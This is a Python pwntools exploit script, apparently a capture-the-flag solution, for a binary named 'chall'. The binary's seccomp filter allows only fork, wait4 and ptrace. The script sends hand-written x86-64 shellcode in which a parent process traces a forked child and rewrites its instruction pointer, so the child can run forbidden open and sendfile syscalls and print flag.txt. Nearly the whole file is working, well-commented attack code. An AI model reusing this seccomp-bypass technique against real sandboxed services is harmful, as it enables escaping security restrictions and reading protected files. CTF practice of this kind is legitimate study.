from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    set follow-fork-mode child
    set follow-exec-mode same
    continue
''')

# p = process('./chall')

# seccomp filter:
# seccomp-tools dump ./chall
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
#  0001: 0x35 0x04 0x00 0x00008000  if (A >= 0x8000) goto 0006
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x15 0x02 0x00 0x0000003d  if (A == wait4) goto 0006
#  0004: 0x15 0x01 0x00 0x00000065  if (A == ptrace) goto 0006
#  0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007
#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS

SYS_OPEN = 2
SYS_SENDFILE = 40
SYS_FORK = 57
SYS_WAIT4 = 61
SYS_PTRACE = 101

PTRACE_TRACEME = 0
PTRACE_CONT = 7
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_SYSCALL = 24

RIP_OFFSET = 16*8

shellcode = asm(f'''
    parent:
        /* fork() */
        mov eax, {SYS_FORK}
        syscall                                             /* fork a child process, return child pid in rax for parent process and 0 in rax for child process */
        test eax, eax
        jz child                                            /* jump to child if fork returns 0, which is child process */
        mov r13, rax                                        /* move child pid to r13 */

        /* wait4(child_pid, NULL, 0, NULL) */
        mov eax, {SYS_WAIT4}
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall                                             /* wait for child process to be ready to be traced, parent process blocks here until child process executes int3 instruction to send SIGTRAP */

        /* ptrace(PTRACE_SYSCALL, child_pid, 0, 0) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_SYSCALL}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall                                             /* trace child process, let child process continue to execute until next syscall instruction for open */

        /* wait4(child_pid, NULL, NULL, NULL) */
        mov eax, {SYS_WAIT4}
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall                                             /* wait for child process to be ready to be traced, parent process blocks here until child process encounter syscall instruction for open */

        /* ptrace(PTRACE_GETREGS, child_pid, 0, rsp) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp                                        /* fourth argument has to be an address of a buffer to store registers, which is set to rsp here */
        syscall                                             /* retrieve child process register state into rsp, all registers values (user_regs_struct) of child process are copied to stack of parent process now */

        /* ptrace(PTRACE_SETREGS, child_pid, 0, rsp) */
        mov rdi, 0x820000000000                             /* prepare an invalid address, which is not a canonical form, whose high position must be all zeros or all ones */
        lea rbx, [rsp+{RIP_OFFSET}]                         /* locate copy of child process rip register saved on parent process stack */
        mov [rbx], rdi                                      /* overwrite it with invalid address above */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall                                             /* write polluted register state back to child process, next instruction address (rip) for child process to be executed has been set to an address that will inevitably cause errors */

        /* ptrace(PTRACE_CONT, child_pid, 0, 0) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_CONT}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall                                             /* continue child process execution, syscall for open in child process will be executed successfully */

        /* wait4(child_pid, NULL, 0, NULL) */
        mov eax, {SYS_WAIT4}
        mov rdi, r13
        mov rsi, rsp
        xor edx, edx
        xor r10, r10
        syscall                                             /* wait for child process to be ready to be traced, parent process blocks here until child process encounters polluted rip and sends SIGSEGV */

        /* ptrace(PTRACE_GETREGS, child_pid, 0, rsp) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp                                        /* fourth argument has to be an address of a buffer to store registers, which is set to rsp here */
        syscall                                             /* retrieve child process register state into rsp, all registers values (user_regs_struct) of child process are copied to stack of parent process now */

        /* ptrace(PTRACE_SETREGS, child_pid, 0, rsp) */
        lea rdi, [rip+sendfile]                             /* prepare address of sendfile module */
        lea rbx, [rsp+{RIP_OFFSET}]                         /* locate copy of child process rip register saved on parent process stack */
        mov [rbx], rdi                                      /* overwrite it with address of sendfile module */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall                                             /* write modified register state back to child process, next instruction address (rip) for child process to be executed has been set to address of sendfile module */

        /* ptrace(PTRACE_SYSCALL, child_pid, 0, 0) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_SYSCALL}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall                                             /* trace child process, let child process continue to execute until next syscall instruction for sendfile */

        /* wait4(child_pid, NULL, NULL, NULL) */
        mov eax, {SYS_WAIT4}
        mov rdi, r13
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall                                             /* wait for child process to be ready to be traced, parent process blocks here until child process encounters syscall instruction for sendfile */

        /* ptrace(PTRACE_GETREGS, child_pid, 0, rsp) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_GETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp                                        /* fourth argument has to be an address of a buffer to store registers, which is set to rsp here */
        syscall                                             /* retrieve child process register state into rsp, all registers values (user_regs_struct) of child process are copied to stack of parent process now */
                    
        /* ptrace(PTRACE_SETREGS, child_pid, 0, rsp) */
        mov rdi, 0x820000000000                             /* prepare an invalid address, which is not a canonical form, whose high position must be all zeros or all ones */
        lea rbx, [rsp+{RIP_OFFSET}]                         /* locate copy of child process rip register saved on parent process stack */
        mov [rbx], rdi                                      /* overwrite it with invalid address above */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_SETREGS}
        mov rsi, r13
        xor edx, edx
        mov r10, rsp
        syscall                                             /* write polluted register state back to child process, next instruction address (rip) for child process to be executed has been set to an address that will inevitably cause errors */
                    
        /* ptrace(PTRACE_CONT, child_pid, 0, 0) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_CONT}
        mov rsi, r13
        xor edx, edx
        xor r10, r10
        syscall                                             /* continue child process execution, syscall for sendfile in child process will be executed successfully */
                    
        /* wait4(child_pid, NULL, 0, NULL) */
        mov eax, {SYS_WAIT4}
        mov rdi, r13
        mov rsi, rsp
        xor edx, edx
        xor r10, r10
        syscall                                             /* wait for child process to be ready to be traced, parent process blocks here until child process encounters polluted rip and sends SIGSEGV */

        hlt

    child:
        /* ptrace(PTRACE_TRACEME, 0, 0, 0) */
        mov eax, {SYS_PTRACE}
        mov edi, {PTRACE_TRACEME}
        xor esi, esi
        xor edx, edx
        xor r10, r10
        syscall                                             /* make child process itself traceable */
        int3                                                /* send SIGTRAP, suspend current child process being tracked immediately */

        open:
            /* open(flag_filename_address, 0, 0) */
            mov eax, {SYS_OPEN}
            lea rdi, [rip+flag]
            xor esi, esi
            xor edx, edx    
            syscall                                         /* once continue execution, syscall for open will be executed successfully, but next instruction address (rip) for child process to be executed has been set to an invalid address 0x820000000000, which will trigger a general protection fault and send SIGSEGV */

        sendfile:
            /* sendfile(1, 3, 0, 0x50) */
            mov rax, {SYS_SENDFILE}
            mov rdi, 1
            mov rsi, 3
            xor edx, edx
            mov r10, 0x50
            syscall                                         /* once continue execution, syscall for sendfile will be executed successfully, but next instruction address (rip) for child process to be executed has been set to an invalid address 0x820000000000, which will trigger a general protection fault and send SIGSEGV */

        hlt

    flag:
        .string "flag.txt"
''')

p.sendline(str(len(shellcode)).encode())
p.send(shellcode)

p.interactive()